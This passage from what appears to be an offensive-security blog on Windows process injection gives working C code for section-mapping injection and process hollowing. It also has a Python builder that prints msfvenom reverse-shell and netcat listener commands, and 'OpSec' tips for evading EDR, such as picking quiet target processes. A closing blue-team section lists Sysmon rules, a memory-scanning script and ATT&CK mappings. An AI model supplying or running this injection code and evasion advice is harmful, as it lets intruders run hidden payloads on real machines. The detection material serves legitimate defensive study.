    size_t sc_len = (size_t)ftell(f);
    rewind(f);
    uint8_t *sc = (uint8_t*)malloc(sc_len);
    fread(sc, 1, sc_len, f);
    fclose(f);

    /* load NT functions */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    #define LOAD(fn) p##fn fn = (p##fn)GetProcAddress(ntdll, #fn)
    LOAD(NtCreateSection);
    LOAD(NtMapViewOfSection);
    LOAD(NtUnmapViewOfSection);
    LOAD(RtlCreateUserThread);
    #undef LOAD

    /* open target */
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        fprintf(stderr, "[-] OpenProcess: %lu\n", GetLastError());
        free(sc);
        return 1;
    }

    /* create shared section — RWX so we can write then remote-exec */
    HANDLE hSection = NULL;
    LARGE_INTEGER sz = { .QuadPart = (LONGLONG)sc_len };
    NTSTATUS ns = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sz,
                                  PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (ns) {
        fprintf(stderr, "[-] NtCreateSection: 0x%08lx\n", ns);
        CloseHandle(hProc);
        free(sc);
        return 1;
    }

    /* map into local process for writing */
    PVOID  pLocal    = NULL;
    SIZE_T viewLocal = 0;
    NtMapViewOfSection(hSection, GetCurrentProcess(),
                       &pLocal, 0, 0, NULL, &viewLocal,
                       ViewShare, 0, PAGE_READWRITE);

    /* map into remote process for execution */
    PVOID  pRemote   = NULL;
    SIZE_T viewRemote = 0;
    NtMapViewOfSection(hSection, hProc,
                       &pRemote, 0, 0, NULL, &viewRemote,
                       ViewShare, 0, PAGE_EXECUTE_READ);

    printf("[*] local  map : %p\n", pLocal);
    printf("[*] remote map : %p\n", pRemote);

    /* write shellcode through local mapping — target sees it immediately */
    memcpy(pLocal, sc, sc_len);
    SecureZeroMemory(sc, sc_len);
    free(sc);
    printf("[*] shellcode written via shared section\n");

    /* unmap local view — shellcode still lives in target */
    NtUnmapViewOfSection(GetCurrentProcess(), pLocal);

    /* create thread in target via RtlCreateUserThread */
    HANDLE hThread = NULL;
    ns = RtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0,
                             pRemote, NULL, &hThread, NULL);
    if (ns) {
        fprintf(stderr, "[-] RtlCreateUserThread: 0x%08lx\n", ns);
        CloseHandle(hSection);
        CloseHandle(hProc);
        return 1;
    }

    printf("[+] thread %p — no WriteProcessMemory used\n", hThread);
    WaitForSingleObject(hThread, 8000);

    CloseHandle(hThread);
    CloseHandle(hSection);
    CloseHandle(hProc);
    return 0;
}
```

---

## Technique 7 — Process Hollowing

The crown jewel of process injection. Spawn a legitimate process suspended, **hollow out its image**, unmapping the original executable from memory, write your PE payload in its place, redirect the entry point, and resume. From the outside, it looks like `notepad.exe` is running. Inside, your payload owns the entire process.

```c {linenos=inline}
/* hollow.c
 * Process hollowing (RunPE).
 * Spawns target suspended, replaces its image with raw PE payload.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o hollow.exe hollow.c \
 *       -s -mwindows -Wl,--build-id=none
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

/* parse PE headers — returns ImageBase, SizeOfImage, AddressOfEntryPoint */
typedef struct {
    uint64_t image_base;
    uint32_t image_size;
    uint32_t entry_rva;
    uint16_t num_sections;
    uint64_t pe_offset;
} PEInfo;

static int parse_pe(const uint8_t *buf, size_t len, PEInfo *out) {
    if (len < 64 || *(uint16_t*)buf != 0x5A4D) return 0;  /* MZ */
    uint32_t pe_off = *(uint32_t*)(buf + 0x3C);
    if (pe_off + 4 >= len) return 0;
    if (*(uint32_t*)(buf + pe_off) != 0x00004550) return 0; /* PE\0\0 */

    /* optional header */
    uint16_t magic = *(uint16_t*)(buf + pe_off + 24);
    if (magic != 0x020B) {  /* PE32+ (x64) only */
        fprintf(stderr, "[-] only PE32+ (x64) supported\n");
        return 0;
    }

    out->pe_offset   = pe_off;
    out->entry_rva   = *(uint32_t*)(buf + pe_off + 40);
    out->image_base  = *(uint64_t*)(buf + pe_off + 48);
    out->image_size  = *(uint32_t*)(buf + pe_off + 80);
    out->num_sections= *(uint16_t*)(buf + pe_off + 6);
    return 1;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr,
            "usage: %s <host.exe> <payload.exe>\n"
            "  host   : suspended process to hollow (e.g. notepad.exe)\n"
            "  payload: PE to inject (must be x64 executable)\n",
            argv[0]);
        return 1;
    }

    char *host_path = argv[1];

    /* load payload PE */
    FILE *f = fopen(argv[2], "rb");
    if (!f) { perror("fopen payload"); return 1; }
    fseek(f, 0, SEEK_END);
    size_t pe_len = (size_t)ftell(f);
    rewind(f);
    uint8_t *pe_buf = (uint8_t*)malloc(pe_len);
    fread(pe_buf, 1, pe_len, f);
    fclose(f);

    PEInfo pe = {0};
    if (!parse_pe(pe_buf, pe_len, &pe)) {
        fprintf(stderr, "[-] invalid PE\n");
        free(pe_buf);
        return 1;
    }

    printf("[*] payload image base : 0x%016llx\n", pe.image_base);
    printf("[*] payload image size : 0x%08x\n",    pe.image_size);
    printf("[*] payload entry RVA  : 0x%08x\n",    pe.entry_rva);

    /* spawn host suspended */
    STARTUPINFOA        si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessA(NULL, host_path, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[-] CreateProcess(%s): %lu\n", host_path, GetLastError());
        free(pe_buf);
        return 1;
    }
    printf("[+] spawned  %s  PID %lu  TID %lu\n",
           host_path, pi.dwProcessId, pi.dwThreadId);

    /* get PEB base address from remote process */
    PROCESS_BASIC_INFORMATION pbi = {0};
    typedef NTSTATUS(NTAPI *pNtQIP)(HANDLE,PROCESSINFOCLASS,PVOID,ULONG,PULONG);
    pNtQIP NtQIP = (pNtQIP)GetProcAddress(
        GetModuleHandleA("ntdll"), "NtQueryInformationProcess");
    NtQIP(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

    /* read image base from PEB */
    uint64_t peb_addr = (uint64_t)pbi.PebBaseAddress;
    uint64_t host_base = 0;
    SIZE_T   rd = 0;
    ReadProcessMemory(pi.hProcess,
                      (LPCVOID)(peb_addr + 0x10), /* PEB.ImageBaseAddress */
                      &host_base, sizeof(host_base), &rd);
    printf("[*] host image base    : 0x%016llx\n", host_base);

    /* hollow — unmap the original image */
    pNtUnmapViewOfSection NtUVOS = (pNtUnmapViewOfSection)GetProcAddress(
        GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");
    NtUVOS(pi.hProcess, (PVOID)host_base);
    printf("[*] host image unmapped\n");

    /* allocate space for payload at its preferred base */
    LPVOID alloc_base = VirtualAllocEx(
        pi.hProcess, (LPVOID)pe.image_base, pe.image_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!alloc_base) {
        /* preferred base taken — let OS pick */
        alloc_base = VirtualAllocEx(
            pi.hProcess, NULL, pe.image_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        printf("[*] rebasing to      : %p\n", alloc_base);
    }
    printf("[*] alloc at           : %p\n", alloc_base);

    /* write PE headers */
    uint32_t hdr_size = *(uint32_t*)(pe_buf + pe.pe_offset + 84); /* SizeOfHeaders */
    WriteProcessMemory(pi.hProcess, alloc_base, pe_buf, hdr_size, NULL);

    /* write sections */
    IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER*)(
        pe_buf + pe.pe_offset + 24 +
        *(uint16_t*)(pe_buf + pe.pe_offset + 20) /* SizeOfOptionalHeader */
    );

    for (int i = 0; i < pe.num_sections; i++) {
        if (sections[i].SizeOfRawData == 0) continue;
        PVOID dst = (PVOID)((uint64_t)alloc_base + sections[i].VirtualAddress);
        WriteProcessMemory(pi.hProcess, dst,
                           pe_buf + sections[i].PointerToRawData,
                           sections[i].SizeOfRawData, NULL);
        printf("[*] section %-8.8s @ %p\n", sections[i].Name, dst);
    }

    /* update PEB.ImageBaseAddress to point to our payload */
    uint64_t new_base = (uint64_t)alloc_base;
    WriteProcessMemory(pi.hProcess,
                       (LPVOID)(peb_addr + 0x10),
                       &new_base, sizeof(new_base), NULL);

    /* redirect main thread entry point to payload EP */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = new_base + pe.entry_rva;   /* Rcx = entry point on x64 */
    SetThreadContext(pi.hThread, &ctx);

    printf("[+] entry point → 0x%016llx\n", ctx.Rcx);

    SecureZeroMemory(pe_buf, pe_len);
    free(pe_buf);

    /* resume — payload runs as notepad.exe */
    ResumeThread(pi.hThread);
    printf("[+] resumed — payload executing as %s\n", host_path);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```

```bash
# compile
x86_64-w64-mingw32-gcc -o hollow.exe hollow.c -s -mwindows -Wl,--build-id=none

# hollow notepad with your reverse shell PE
./hollow.exe "C:\Windows\System32\notepad.exe" payload.exe
```

---

## Python — Injection Payload Builder

Chains shellcode generation, encryption, and injection command output into one tool.

```python {linenos=inline}
#!/usr/bin/env python3
# injection_builder.py
# Generates encrypted shellcode and matching injection command strings
# for each technique covered in this blog.
#
# Requires: pip install keystone-engine
#
# Usage:
#   python3 injection_builder.py --lhost 10.10.10.10 --lport 4444 --pid 1234
#   python3 injection_builder.py --lhost 10.10.10.10 --lport 4444 --pid 1234 \
#       --technique earlybird --key 0x42

import argparse
import os
import struct
import random

try:
    import keystone
    HAS_KS = True
except ImportError:
    HAS_KS = False


def rolling_xor(data: bytes, key: int) -> bytes:
    return bytes(b ^ ((key + i) & 0xff) for i, b in enumerate(data))


def make_shellcode_x64(lhost: str, lport: int) -> bytes:
    """
    Generate a minimal x64 reverse TCP shellcode using keystone assembler.
    For production use msfvenom or custom shellcode — this is illustrative.
    """
    if not HAS_KS:
        # fallback: msfvenom instruction
        print("[!] keystone not installed — use msfvenom to generate shellcode:")
        print(f"    msfvenom -p windows/x64/shell_reverse_tcp "
              f"LHOST={lhost} LPORT={lport} -f raw -o shellcode.bin")
        return b''

    # pack IP as dword (little-endian)
    ip_bytes  = bytes(int(x) for x in lhost.split('.'))
    ip_dword  = struct.unpack('<I', ip_bytes)[0]
    port_word = struct.pack('>H', lport)  # big-endian for socket

    # minimal WinSock reverse shell stub (illustrative, not production-grade)
    # In real engagements: use msfvenom, Donut, or custom shellcode
    asm = f"""
    sub rsp, 0x28
    and rsp, 0xFFFFFFFFFFFFFFF0

    ; === WSAStartup ===
    xor rcx, rcx
    mov cx, 0x0202
    lea rdx, [rsp+0x10]
    ; ... (full shellcode assembly omitted for brevity — use msfvenom output)
    """

    print("[!] keystone stub is illustrative — use msfvenom for real shellcode:")
    print(f"    msfvenom -p windows/x64/shell_reverse_tcp "
          f"LHOST={lhost} LPORT={lport} -f raw -o shellcode.bin")
    return b''


def generate_commands(technique: str, pid: int, sc_path: str,
                      key: int, host_exe: str) -> list:
    """Generate injection command strings for the chosen technique."""
    hex_key = f"{key:02x}"

    commands = {
        'classic': [
            f"# Classic shellcode injection",
            f"./classic_inject.exe {pid} {sc_path}",
        ],
        'rwrx': [
            f"# RW→RX two-stage injection (no RWX)",
            f"./rwrx_inject.exe {pid} {sc_path} {hex_key}",
        ],
        'apc': [
            f"# APC injection (all threads)",
            f"./apc_inject.exe {pid} {sc_path}",
            f"# Note: fires when any thread enters alertable wait",
        ],
        'earlybird': [
            f"# Early Bird APC injection",
            f'./earlybird.exe {sc_path} {hex_key} "{host_exe}"',
            f"# Spawns new {os.path.basename(host_exe)} — PID will differ from {pid}",
        ],
        'hijack': [
            f"# Thread context hijacking",
            f"./thread_hijack.exe {pid} {sc_path}",
        ],
        'section': [
            f"# NtMapViewOfSection injection (no WriteProcessMemory)",
            f"./section_inject.exe {pid} {sc_path}",
        ],
        'hollow': [
            f"# Process hollowing (needs full PE payload, not raw shellcode)",
            f'./hollow.exe "{host_exe}" payload.exe',
        ],
    }
    return commands.get(technique, [f"unknown technique: {technique}"])


def main():
    p = argparse.ArgumentParser(description="Injection payload builder")
    p.add_argument('--lhost',      required=True)
    p.add_argument('--lport',      default=4444, type=int)
    p.add_argument('--pid',        default=0,    type=int,
                   help="target PID (from Find-InjectableProcesses.ps1)")
    p.add_argument('--technique',
                   choices=['classic','rwrx','apc','earlybird',
                            'hijack','section','hollow','all'],
                   default='all')
    p.add_argument('--key',        default=None,
                   help="XOR key hex (e.g. 0x42) — random if omitted")
    p.add_argument('--host-exe',
                   default=r'C:\Windows\System32\notepad.exe')
    p.add_argument('--out',        default='shellcode.bin')
    args = p.parse_args()

    key = int(args.key, 16) if args.key else random.randint(1, 254)
    print(f"[*] XOR key      : 0x{key:02x}")
    print(f"[*] target       : {args.lhost}:{args.lport}")
    print(f"[*] inject PID   : {args.pid}")
    print(f"[*] host exe     : {args.host_exe}")
    print()

    # shellcode gen instruction
    print("[*] generate shellcode:")
    print(f"    msfvenom -p windows/x64/shell_reverse_tcp "
          f"LHOST={args.lhost} LPORT={args.lport} -f raw -o raw.bin")
    print(f"    python3 encrypt_sc.py -i raw.bin -k 0x{key:02x} -o {args.out} --verify")
    print()

    # command output
    techniques = (['classic','rwrx','apc','earlybird','hijack','section','hollow']
                  if args.technique == 'all' else [args.technique])

    for t in techniques:
        cmds = generate_commands(t, args.pid, args.out, key, args.host_exe)
        print('─' * 60)
        for c in cmds:
            print(c)
    print('─' * 60)
    print(f"\n[*] listener: rlwrap nc -lvnp {args.lport}")


if __name__ == '__main__':
    main()
```

```bash
# generate all injection commands
python3 injection_builder.py --lhost 10.10.10.10 --lport 4444 --pid 1234

# specific technique with key
python3 injection_builder.py \
    --lhost 10.10.10.10 --lport 4444 --pid 1234 \
    --technique earlybird --key 0x42
```

---

## Technique Comparison

| technique | new thread | API noise | RWX needed | process survives | stealth |
|-----------|-----------|-----------|------------|-----------------|---------|
| Classic CRT | yes | high | yes (typical) | yes | low |
| RW→RX CRT | yes | medium | no | yes | medium |
| APC | no | medium | no | yes | medium |
| Early Bird | no | medium | no | yes | high |
| Thread Hijack | no | low | no | yes | high |
| NtMapViewOfSection | optional | low | no | yes | high |
| Process Hollow | new process | medium | yes | payload replaces host | very high |

---

## OpSec Notes

- **`CreateRemoteThread`** is one of the most-monitored APIs on the planet. Every major EDR generates an alert on it. Prefer APC, thread hijacking, or section-based injection for production engagements.
- **Target process selection** matters enormously. Injecting into `lsass.exe` will trigger immediate Credential Guard and EDR alerts even if the injection itself is silent. `explorer.exe` and `RuntimeBroker.exe` are quieter targets with rich thread pools for APC delivery.
- **Architecture must match.** A 64-bit shellcode in a 32-bit process crashes. A 32-bit injector cannot open a 64-bit process with `PROCESS_ALL_ACCESS` without WoW64 tricks. Always match bitness.
- **`PROCESS_ALL_ACCESS`** is noisy — it's `0x1F0FFF` and shows up bright in Sysmon EID 10. Request only the access rights you need: `PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD` for classic injection.
- **Early Bird** is the quietest CRT-equivalent because the APC fires during loader initialization before most AV hooks install themselves into the new process.
- **Process Hollowing** is detected by memory integrity scanners that compare the on-disk PE with the in-memory image. Mixing in relocations and base rebasing helps, but modern EDRs have seen it all.

---

## Detection (Blue Team)

| signal | event |
|--------|-------|
| `OpenProcess` with high access on unrelated process | Sysmon EID 10 — ProcessAccess |
| `CreateRemoteThread` across process boundary | Sysmon EID 8 — CreateRemoteThread |
| Non-image RWX memory region in process | EDR memory scan / Volatility |
| `NtMapViewOfSection` creating shared executable region | ETW — kernel provider |
| `SetThreadContext` changing RIP to non-image address | ETW — thread provider |
| `QueueUserAPC` to alertable thread in another process | ETW / API hooking |
| PE in memory doesn't match on-disk image | Memory forensics — pe-sieve, Moneta |
| Unsigned DLL/PE loaded by signed process | Sysmon EID 7 — ImageLoad |

**Sysmon detection rules:**

```xml {linenos=inline}
<!-- cross-process access with high rights -->
<ProcessAccess onmatch="include">
  <GrantedAccess condition="contains">0x1F0FFF</GrantedAccess>
  <GrantedAccess condition="contains">0x1FFFFF</GrantedAccess>
  <GrantedAccess condition="contains">0x40</GrantedAccess>
</ProcessAccess>

<!-- CreateRemoteThread from unexpected source -->
<CreateRemoteThread onmatch="include">
  <SourceImage condition="is not">C:\Windows\System32\csrss.exe</SourceImage>
  <SourceImage condition="is not">C:\Windows\System32\wininit.exe</SourceImage>
</CreateRemoteThread>

<!-- thread context manipulation -->
<ProcessAccess onmatch="include">
  <GrantedAccess condition="contains">0x0400</GrantedAccess>
</ProcessAccess>
```

**Live memory scanner — hunt for injected shellcode:**

```powershell {linenos=inline}
# Hunt-InjectedMemory.ps1
# Finds non-image RWX/RX memory regions in running processes
# Indicator of injected shellcode or hollowed processes

param([int[]]$PIDs)

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class MemScan {
    [DllImport("kernel32")] public static extern IntPtr OpenProcess(uint a, bool b, int pid);
    [DllImport("kernel32")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32")] public static extern int VirtualQueryEx(
        IntPtr hProcess, IntPtr lpAddress,
        out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);
    [StructLayout(LayoutKind.Sequential)] public struct MEMORY_BASIC_INFORMATION {
        public IntPtr BaseAddress, AllocationBase;
        public uint AllocationProtect, __alignment1;
        public IntPtr RegionSize;
        public uint State, Protect, Type, __alignment2;
    }
    public const uint MEM_IMAGE  = 0x1000000;
    public const uint MEM_COMMIT = 0x1000;
    public const uint PAGE_EXECUTE_READ       = 0x20;
    public const uint PAGE_EXECUTE_READWRITE  = 0x40;
    public const uint PAGE_EXECUTE_WRITECOPY  = 0x80;
}
"@

$targets = if ($PIDs) { Get-Process -Id $PIDs } else { Get-Process }

foreach ($proc in $targets) {
    $hProc = [MemScan]::OpenProcess(0x0410, $false, $proc.Id)
    if ($hProc -eq [IntPtr]::Zero) { continue }

    $addr = [IntPtr]::Zero
    $mbi  = New-Object MemScan+MEMORY_BASIC_INFORMATION
    $sz   = [Runtime.InteropServices.Marshal]::SizeOf($mbi)

    while ([MemScan]::VirtualQueryEx($hProc, $addr, [ref]$mbi, $sz) -gt 0) {
        $exec = $mbi.Protect -band (0x20 -bor 0x40 -bor 0x80)
        $notImage = $mbi.Type -ne [MemScan]::MEM_IMAGE
        $committed = $mbi.State -eq [MemScan]::MEM_COMMIT

        if ($exec -and $notImage -and $committed) {
            Write-Host "[!] $($proc.Name) PID $($proc.Id) — " `
                       "non-image executable region @ $($mbi.BaseAddress.ToString('X16')) " `
                       "size $($mbi.RegionSize) prot 0x$($mbi.Protect.ToString('X'))" `
                -ForegroundColor Red
        }

        try {
            $next = [IntPtr]($addr.ToInt64() + $mbi.RegionSize.ToInt64())
            $addr = $next
        } catch { break }
    }
    [MemScan]::CloseHandle($hProc) | Out-Null
}
```

```powershell
# scan all processes
.\Hunt-InjectedMemory.ps1

# scan specific PIDs
.\Hunt-InjectedMemory.ps1 -PIDs 1234, 5678
```

---

## MITRE ATT&CK

| technique | ID | description |
|-----------|----|-------------|
| Process Injection | T1055 | Parent — all injection techniques |
| DLL Injection | T1055.001 | LoadLibrary-based injection |
| Portable Executable Injection | T1055.002 | PE written to remote memory |
| Asynchronous Procedure Call | T1055.004 | APC + Early Bird |
| Thread Execution Hijacking | T1055.003 | Thread context hijack |
| Process Hollowing | T1055.012 | RunPE / image replacement |
| Defense Evasion | TA0005 | Primary tactic |
| Privilege Escalation | TA0004 | When injecting into higher-priv process |

---

## References

- [MITRE ATT&CK T1055 — Process Injection](https://attack.mitre.org/techniques/T1055/)
- [MITRE ATT&CK T1055.012 — Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK T1055.004 — APC Injection](https://attack.mitre.org/techniques/T1055/004/)
- Amit Klein + Itzik Kotler — Early Bird APC research
- [hasherezade — pe-sieve (memory scanner)](https://github.com/hasherezade/pe-sieve)
- [Moneta — live memory anomaly detection](https://github.com/forrest-orr/moneta)
- [maldev-for-dummies — injection reference](https://github.com/chvancooten/maldev-for-dummies)
- [Process Hacker — open source](https://processhacker.sourceforge.io/)
- [LOLBAS Project](https://lolbas-project.github.io/)
- Stephen Fewer — Reflective DLL Injection original research
